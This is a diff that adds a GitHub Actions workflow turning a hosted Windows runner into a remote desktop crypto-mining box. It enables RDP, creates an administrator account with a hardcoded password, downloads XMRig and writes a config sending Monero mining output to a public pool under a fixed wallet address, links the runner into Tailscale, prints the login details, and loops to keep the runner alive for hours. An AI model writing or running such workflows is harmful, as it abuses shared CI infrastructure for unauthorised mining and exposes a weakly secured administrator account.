@@ -1,0 +1,118 @@
+name: RDP TEST with Pre-Configured XMRig
+
+on:
+  workflow_dispatch:
+
+jobs:
+  secure-rdp:
+    runs-on: windows-latest
+    timeout-minutes: 3600
+
+    steps:
+      - name: Configure Core RDP Settings
+        run: |
+          # Enable Remote Desktop and configure firewall
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+          netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389
+
+      - name: Create RDP User with Static Password
+        run: |
+          $password = "Runner-12345"
+          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
+          
+          echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV
+          
+          if (-not (Get-LocalUser -Name "RDP")) {
+              Write-Error "User creation failed"
+              exit 1
+          }
+
+      - name: Install and Configure XMRig Miner
+        run: |
+          $minerVersion = "6.24.0"
+          $downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v$($minerVersion)/xmrig-$($minerVersion)-msvc-win64.zip"
+          $zipPath = "$env:TEMP\xmrig.zip"
+          $extractPath = "C:\Users\RDP\Desktop"
+
+          Write-Host "Downloading XMRig v$($minerVersion)..."
+          Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath
+
+          Write-Host "Extracting XMRig to the RDP user's Desktop..."
+          Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+          
+          $minerFolder = (Get-ChildItem -Path $extractPath -Directory | Where-Object { $_.Name -like 'xmrig*' }).FullName
+          
+          Write-Host "Creating pre-filled config.json with your wallet address..."
+          # This config now includes your hardcoded temporary address.
+          $configJson = @"
+          {
+              "autosave": true,
+              "cpu": true,
+              "opencl": false,
+              "cuda": false,
+              "pools": [
+                  {
+                      "algo": "rx/0",
+                      "url": "pool.supportxmr.com:5555",
+                      "user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP",
+                      "pass": "x"
+                  }
+              ]
+          }
+"@
+          Set-Content -Path (Join-Path $minerFolder "config.json") -Value $configJson
+
+          Write-Host "Creating a 'Start Miner' shortcut on the Desktop..."
+          $shortcutContent = @"
+          @echo off
+          echo Starting XMRig Miner...
+          cd /d "%~dp0"
+          cd "$($minerFolder.Split('\')[-1])"
+          xmrig.exe
+          pause
+"@
+          Set-Content -Path (Join-Path $extractPath "Start-Miner.bat") -Value $shortcutContent
+          
+          Write-Host "XMRig Miner is now fully pre-configured on the Desktop."
+
+
+      - name: Install Tailscale
+        run: |
+          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe" -OutFile "$env:TEMP\tailscale.exe"
+          Start-Process "$env:TEMP\tailscale.exe" -ArgumentList "/quiet" -Wait
+
+      - name: Establish Tailscale Connection
+        run: |
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
+          
+          Start-Sleep -Seconds 10
+          $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+          
+          if (-not $tsIP) {
+              Write-Error "Tailscale IP not assigned. Exiting."
+              exit 1
+          }
+          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
+      
+      - name: Display RDP Connection Details
+        run: |
+          Write-Host "================================================================"
+          Write-Host "                 RDP ACCESS READY"
+          Write-Host "================================================================"
+          Write-Host "Tailscale IP Address: $env:TAILSCALE_IP"
+          Write-Host "Username: RDP"
+          Write-Host "Password: ${{ env.RDP_PASSWORD }}"
+          Write-Host "----------------------------------------------------------------"
+          Write-Host "ON THE DESKTOP:"
+          Write-Host "- The XMRig miner is fully configured and ready to run."
+          Write-Host "- Just double-click 'Start-Miner.bat' to begin."
+          Write-Host "================================================================"
+
+      - name: Maintain Connection
+        run: |
+          while ($true) {
+              Start-Sleep -Seconds 300
+          }
